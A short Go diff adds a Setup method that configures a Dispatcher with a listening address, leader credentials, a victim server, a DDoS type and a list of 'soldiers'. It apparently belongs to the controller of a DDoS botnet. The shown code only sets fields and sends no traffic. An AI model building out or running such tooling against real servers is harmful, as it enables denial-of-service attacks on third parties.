@@ -40,6 +40,17 @@ func (d *Dispatcher) SetupDefault() {
 	d.Cmp.Soldiers = make([]Soldier, 0)
 }
 
+func (d *Dispatcher) Setup(address, port, name, password, victim, ddosType string) {
+	d.ListeningAddress = address
+	d.ListeningPort = port
+	d.Cmp.Leader.Name = name
+	d.Cmp.Leader.AuthenticationHash = HashOf(password)
+	d.Cmp.Settings.Status = StatusStopped
+	d.Cmp.Settings.VictimServer = victim
+	d.Cmp.Settings.DDOSType = ddosType
+	d.Cmp.Soldiers = make([]Soldier, 0)
+}
+
 func (c *Camp) UpdateSettings(status, victim, ddosType string) {
 	if status != "" {
 		c.Settings.Status = status
